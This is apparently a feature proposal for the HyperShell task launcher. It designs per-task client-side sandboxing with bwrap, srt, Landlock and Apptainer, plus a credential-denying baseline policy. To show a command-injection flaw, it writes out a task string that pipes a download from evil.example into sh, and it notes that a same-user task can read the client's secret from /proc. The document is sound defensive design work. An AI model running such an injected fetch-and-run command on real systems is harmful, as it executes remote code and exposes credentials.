---
status: unshaped
kind: feature
appetite: small
target: 2.10.0
lane: public
---

# Client-side sandboxing: a supported pattern for wrapping each task

> **Candidate, not a contract.** `/hs-feature` promotes this into `spec/{slug}/GOAL.md`, where
> appetite, non-goals and R-IDs get negotiated. Do not copy it verbatim.
>
> **Pair:** `issues/untrusted-server-task-signing.md`. Both seeds address the same threat: a
> compromised server. Signing stops the server from authoring tasks; this seed bounds the damage from
> tasks that were legitimately signed and still turn out harmful. Either can ship first.
>
> **Depends on:** `issues/templating-and-remote-env-contract.md` R1, the quoted substitution token.
> If R1 has shipped, use its token. If it hasn't, this cycle pulls R1 in.

## Problem

A client runs server-supplied commands with the user's privileges. On a shared system a takeover is
user-level, so the exposure is credentials (SSH keys, API tokens, data-transfer credentials) read and
sent off-host, plus writes anywhere the user can write.

Users can try to wrap each task in a sandbox through `-t/--template` today, and it doesn't work. `{}`
is spliced unquoted into a `shell=True` command (line references in the templating seed), so the outer
shell parses the task string, and that shell runs outside the sandbox. With the template
`bwrap --ro-bind / / … {}` and the task `true; curl https://evil.example/x | sh`, the outer shell runs
`bwrap … true` and then runs the pipeline unsandboxed. The wrapper appears to be in place and confines
nothing.

## Outcome / vision

The enforcement happens in the kernel, on the child process: Seatbelt, bubblewrap namespaces,
Landlock, containers. That is where the agent-sandboxing tools have settled. HyperShell doesn't ship a
sandbox. It makes wrapping each task with an existing one correct, and documents how. With the quoted
token, the template `srt --settings policy.json -- bash -c {q}` (token name settled in the templating
seed) hands the whole task to the inner shell as one argument. The docs present this as a supported
pattern, with recommended backends and a baseline policy. A `--sandbox` flag can follow later and
check at startup that the sandbox actually confines.

## Settled with Geoffrey (2026-11-22)

- **A shim, not a package.** No pure-Python sandbox extra. The mature tools are processes, and a
  wrapper template fits the way launchers already work.
- **Template first, flag later.** The flag is a convenience that expands to a tested template and adds
  a startup check.
- **The client owns the policy.** It's a local file chosen by whoever runs the client. The server
  never sends it and can't override it.
- **Fail closed.** A requested sandbox that isn't available stops the client; it never runs tasks
  unconfined.
- **Command filters and a model judge are not enforcement.** A hostile command gets past any parser
  through `python -c`, `eval`, an encoded payload, or a binary it just downloaded. Both are out of
  scope here. A model judge could later be advisory: flag, log or hold unfamiliar command shapes,
  cached by template.

## Sketch of the acceptance criteria

- **R1** — Under a wrapper template that uses the quoted token, the wrapper SHALL receive the entire
  task string as a single argument, for tasks containing `;`, `&&`, `|`, `$( )`, backticks, both
  quote characters and newlines. Tested with a stub wrapper that records its argv.
- **R2** — The docs SHALL present client-side sandboxing as a supported pattern, with a worked
  template for each recommended backend: `srt` (Anthropic sandbox-runtime), `bwrap`, a Landlock-based
  launcher, and Apptainer per task.
- **R3** — The docs SHALL give a baseline policy: deny reads of credential paths (`~/.ssh`, cloud and
  data-transfer tokens, HyperShell's own config and authkey), allow writes only to the working
  directory and scratch, and limit network egress to an allowlist where the backend supports it. A
  launched client holds the run's key in its own environment (`HYPERSHELL_SERVER_AUTH`), and
  `task_env()` keeps it out of the task's environment only. A task running as the same user can still
  read `/proc/<client pid>/environ`, so the policy SHALL also hide the client's processes (a PID
  namespace) or deny `/proc` reads outside the task's own.
- **R4** — The docs SHALL cover running the whole client inside Apptainer as an alternative, with the
  caveats below.
- **R5** — The docs SHALL warn that an unquoted `{}` inside a wrapper template runs the task's shell
  syntax outside the sandbox, and show the R1 form beside it.
- **R6** — The docs SHALL state that a sandbox bounds damage and does not establish where a task came
  from, and point to task signing.
- **R7** (stretch, cut first) — `--sandbox <backend> --sandbox-policy <file>` SHALL expand to the
  documented template for that backend. Before accepting tasks, the client SHALL check that the
  backend is installed and its kernel features are available (user namespaces, Landlock), then run a
  probe task that tries to write outside the allowed paths and to read a credential path. The client
  SHALL refuse to start if the backend is missing or the probe succeeds.

## Whole-client Apptainer caveats

- Apptainer bind-mounts `$HOME`, the working directory and `/tmp` by default, so `~/.ssh` is visible
  unless the client runs with `--containall` or `--no-home` and binds only what it needs.
- The container shares the host network by default. Network isolation usually needs privileges the
  site doesn't grant, so this gives filesystem isolation without egress control.
- The boundary contains the client itself, so a hostile task can read the client's authkey and
  interfere with the client. Wrapping each task avoids that exposure.

## Backend notes, as of 2026-11 (re-verify at shaping)

- **`srt`** (anthropic-experimental/sandbox-runtime): CLI with a JSON policy covering read and write
  allow and deny lists plus a network domain allowlist enforced through a proxy. Seatbelt on macOS,
  bubblewrap on Linux. Ships on npm, so it needs Node. Labelled beta / research preview.
- **`bwrap`**: mature and unprivileged; needs unprivileged user namespaces, which some HPC sites
  disable.
- **Landlock**: inherited by child processes and able to restrict which paths may be executed.
  Availability shows in `/sys/kernel/security/lsm`. The Python options (`sandlock`, which adds
  seccomp; `py-landlock`; `landlock`) are libraries. Recent `sandlock` releases need Linux 6.7+, which
  excludes stock RHEL 9 kernels; check the minimum for any pinned version. Open question for shaping:
  whether the docs show a short launcher script or HyperShell ships one as a helper command.
- **Apptainer**: already deployed on most HPC systems. Container start cost per task matters at
  HyperShell's throughput; measure it.
- **nsjail, firejail, gVisor `runsc do`**: workable, less common on HPC.
- **Unsuitable:** Vercel's `just-bash` simulates a shell over an in-memory filesystem, can't run real
  binaries, and has no process boundary from its host.

## Notes

- **Per-task wrapping confines tasks, not the client process.** The queue's RPC framing is pickle in
  both directions (`docs/security.rst`, "Pickle-serialized RPC"), and its replacement is
  `issues/queue-wire-codec.md` (planned for 2.9.0a10). Until that lands, this seed does not fully
  hold against a compromised server, and the docs should say so. Of the patterns here, only the whole-client container sits outside that
  gap.
- Measure per-task startup overhead for each documented backend; HyperShell tasks can be very short,
  and the docs should quote the cost.
- The deployment guide now in progress should link the sandboxing page.
- Found by: design discussion with Geoffrey while scoping the deployment guide, 2026-11-22.

## Sources

- https://github.com/anthropic-experimental/sandbox-runtime
- https://code.claude.com/docs/en/sandbox-environments.md
- https://pypi.org/project/sandlock/
- https://pypi.org/project/py-landlock/
- https://pypi.org/project/landlock/
- https://cdn.jsdelivr.net/npm/just-bash@2.14.0/README.md
